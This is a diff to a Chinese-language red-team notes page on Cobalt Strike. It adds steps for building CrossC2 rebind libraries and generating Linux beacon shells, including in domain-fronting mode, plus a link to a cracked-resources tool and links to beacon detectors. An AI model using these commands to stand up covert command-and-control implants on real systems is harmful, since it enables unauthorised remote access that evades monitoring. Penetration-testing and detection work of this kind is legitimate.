@@ -54,6 +54,7 @@ cert="73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F"
 
     只需删除 resources 文件夹和 scripts 文件夹即可去除汉化
     ```
+- [ca3tie1/CrackSleeve](https://github.com/ca3tie1/CrackSleeve)
 
 ---
 
@@ -1115,9 +1116,60 @@ genCrossC2.Win.exe 192.168.141.151 443 ./.cobaltstrike.beacon_keys null Linux x6
 - https://0x20h.com/p/c02f.html
 - https://www.cnblogs.com/micr067/p/13311206.html
 
+**生成 rebind 库**
+
+当 teamserver 配置了 c2profile 时，需要提前生成 rebind 库供生成 beacon 时使用
+
+参考官方的格式
+- https://gloxec.github.io/CrossC2/zh_cn/protocol/
+- https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/https.profile
+- https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/c2profile.c
+- https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/proxy_udp.py
+- https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/rebind_udp.c
+
+修改完毕后,测试 profile,编译生成
+```bash
+./c2lint test.profile
+
+# 登录 cs 生成 rebind 库供生成 beacon
+gcc test.c -fPIC -shared -o lib_rebind_test.so
+```
+
+**直接生成 shell**
+```bash
+# 登录 cs 生成 shell
+./genCrossC2.Linux xx.xx.xx.xx 443 .cobaltstrike.beacon_keys null Linux x64 shell
+```
+
+**域前置模式下生成 shell**
+
+```bash
+# 登录 cs 生成 shell
+./genCrossC2.Linux xx.xx.xx.xx 443 .cobaltstrike.beacon_keys ./lib_rebind_test.so Linux x64 shell
+
+# 注意 mac m1 下生成的 shell , x86 运行上不了线
+```
+
+**导入 cna**
+
+下载 https://github.com/gloxec/CrossC2/releases/download/v3.1.0/CrossC2Kit-GithubBot-2022-06-07.zip
+
+导入 CrossC2Kit_Loader.cna
+
+**注意**
+
+其实可以不用 CrossC2.cna 这个脚本, 直接在 cs 服务器的命令行下生成即可, 注意生成时候的回连地址, 如果是域前置要把域前置的 ip 指定，然后 host 头要在 profile 里指定，和 genCrossC2.Linux 没有关系
+
+如果还是上不了线,建议仔细看看这几个issue
+- https://github.com/gloxec/CrossC2/issues/60
+- https://github.com/gloxec/CrossC2/issues/89
+- https://github.com/gloxec/CrossC2/issues/65
+
+另外，mac m1 下生成的 shell ，x86 机器是用不了的，所以建议 cs 全套都在 x86 的机器上弄
+
 ---
 
-## CS样本
+## CS 样本
 
 目录中有一个 CobaltStrike.jar 文件，直接解压，这里面有一个名为 resources 的文件夹，就是 CobaltStrike 的配置信息，我们在 CobaltStrike 控制台生成的木马都来源于这个文件夹。
 
@@ -1527,6 +1579,8 @@ userwx  |  false |  Use RWX as final permissions for injected content. Alternati
     ```
 - [hariomenkel/CobaltSpam](https://github.com/hariomenkel/CobaltSpam) - can be used to spam a CobaltStrike server with fake beacons
 - [jas502n/CS_mock](https://github.com/jas502n/CS_mock) - 模拟cobalt strike beacon上线包.
+- [huoji120/CobaltStrikeDetected](https://github.com/huoji120/CobaltStrikeDetected) - 40 行代码检测到大部分 CobaltStrike 的 shellcode
+- [CCob/BeaconEye](https://github.com/CCob/BeaconEye) - Hunts out CobaltStrike beacons and logs operator command output
 
 **爆破 cobaltstrike teamserver 密码**
 ```bash
